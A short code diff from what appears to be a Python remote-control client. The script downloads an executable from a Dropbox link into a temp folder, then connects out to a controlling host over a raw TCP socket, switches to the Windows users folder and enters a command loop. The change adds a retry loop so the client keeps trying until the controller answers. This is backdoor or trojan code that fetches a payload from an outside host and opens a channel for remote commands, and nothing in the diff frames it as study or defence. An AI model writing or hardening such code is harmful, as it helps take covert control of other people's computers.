@@ -44,16 +44,22 @@ if os.name == "nt":
     MessageBox = ctypes.windll.user32.MessageBoxW
 
 urllib.request.urlretrieve("https://www.dropbox.com/s/m6sqwjz63sr38ci/SetVol.exe?dl=1", "/temp/SetVol.exe")
-
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.connect((TCP_IP, TCP_PORT))
-os.chdir("C:/Users/")
-ytlink1 = "https://www.youtube.com/watch_popup?v="
-data = []
-data.insert(0, "")
-conn = s
+connected = False
+while connected == False:
+    time.sleep(1)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.connect((TCP_IP, TCP_PORT))
+        os.chdir("C:/Users/")
+        ytlink1 = "https://www.youtube.com/watch_popup?v="
+        data = []
+        data.insert(0, "")
+        conn = s
+        connected = True
+    except Exception:
+        connected = False
+        print("trying to connect..")
 while 1:
     data.insert(0, "")
     try:
